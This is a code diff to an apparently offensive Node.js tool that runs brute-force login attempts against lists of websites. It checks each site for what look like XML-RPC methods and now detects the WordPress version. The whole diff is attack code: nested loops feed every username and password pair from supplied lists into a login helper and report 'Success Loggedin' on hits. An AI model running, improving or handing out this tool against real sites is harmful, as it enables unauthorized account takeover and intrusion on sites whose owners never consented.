@@ -47,15 +47,15 @@ const {
 const {
     siteList,
     userList,
-    passList,
-    help
+    passList
 } = argv;
 
 const {
     delay,
     getListMethods,
     sayHello,
-    testLogin
+    testLogin,
+    checkWp
 } = require(pathTo() + '/' + 'src/helpers');
 
 var rsiteList, ruserList, rpassList;
@@ -115,75 +115,90 @@ async function main() {
         var url = listSite[i];
         try {
             var {
-                status
-            } = await getListMethods(url);
-            console.log(`Site vuln: ${url}`.ansii({
-                type: info,
-                color: blue
-            }));
-            bulk.site[url] = {
-                status: true,
-                users: null
-            }
+                version
+            } = await checkWp(url);
 
-            var {
-                string
-            } = await sayHello(url);
-            console.log(`Site say: ${string}`.ansii({
-                type: info,
-                color: blue
-            }));
-            console.log('Trying to bruteforce attack...\n'.ansii({
-                type: info,
-                color: blue
-            }));
-            await delay(2000);
-            for (var u = 0; u < listUser.length; u++) {
-                for (var p = 0; p < listPass.length; p++) {
-                    await delay(1000);
-                    try {
-                        var {
-                            data
-                        } = await testLogin(url, {
-                            username: listUser[u],
-                            password: listPass[p]
-                        });
-                        console.log(`URL: ${url}`.ansii({
-                            type: radioOff,
-                            color: green
-                        }));
-                        console.log(`Trying with: ${listUser[u]}|${listPass[p]}`.ansii({
-                            type: info,
-                            color: blue
-                        }));
-                        console.log('Success Loggedin\n'.ansii({
-                            type: check,
-                            color: green
-                        }));
-                    } catch ({
-                        message
-                    }) {
-                        console.log(`URL: ${url}`.ansii({
-                            type: radioOff,
-                            color: green
-                        }));
-                        console.log(`Trying with: ${listUser[u]}|${listPass[p]}`.ansii({
-                            type: info,
-                            color: blue
-                        }));
-                        console.log(`${message ? message : 'maybe request was blocked.'}\n`.ansii({
-                            type: warning,
-                            color: red
-                        }));
+            try {
+                var {
+                    status
+                } = await getListMethods(url);
+                console.log(`Site vuln: ${url}`.ansii({
+                    type: info,
+                    color: blue
+                }), `(${version})`);
+                bulk.site[url] = {
+                    status: true,
+                    users: null
+                }
+
+                var {
+                    string
+                } = await sayHello(url);
+                console.log(`Site say: ${string}`.ansii({
+                    type: info,
+                    color: blue
+                }));
+                console.log('Trying to bruteforce attack...\n'.ansii({
+                    type: info,
+                    color: blue
+                }));
+                await delay(2000);
+                for (var u = 0; u < listUser.length; u++) {
+                    for (var p = 0; p < listPass.length; p++) {
+                        await delay(1000);
+                        try {
+                            var {
+                                data
+                            } = await testLogin(url, {
+                                username: listUser[u],
+                                password: listPass[p]
+                            });
+                            console.log(`URL: ${url}`.ansii({
+                                type: radioOff,
+                                color: green
+                            }));
+                            console.log(`Trying with: ${listUser[u]}|${listPass[p]}`.ansii({
+                                type: info,
+                                color: blue
+                            }));
+                            console.log('Success Loggedin\n'.ansii({
+                                type: check,
+                                color: green
+                            }));
+                        } catch ({
+                            message
+                        }) {
+                            console.log(`URL: ${url}`.ansii({
+                                type: radioOff,
+                                color: green
+                            }));
+                            console.log(`Trying with: ${listUser[u]}|${listPass[p]}`.ansii({
+                                type: info,
+                                color: blue
+                            }));
+                            console.log(`${message ? message : 'maybe request was blocked.'}\n`.ansii({
+                                type: warning,
+                                color: red
+                            }));
+                        }
                     }
                 }
+            } catch ({
+                message
+            }) {
+                console.log(`${message}`.ansii({
+                    type: warning,
+                    color: red
+                }), `(${version})`);
             }
-        } catch (e) {
+        } catch ({
+            message
+        }) {
             bulk.site[url] = {
                 status: false
             }
 
-            console.log(`Site not vuln: ${url}`.ansii({
+            console.log(`${message}`.ansii({
                 type: warning,
                 color: red
             }));
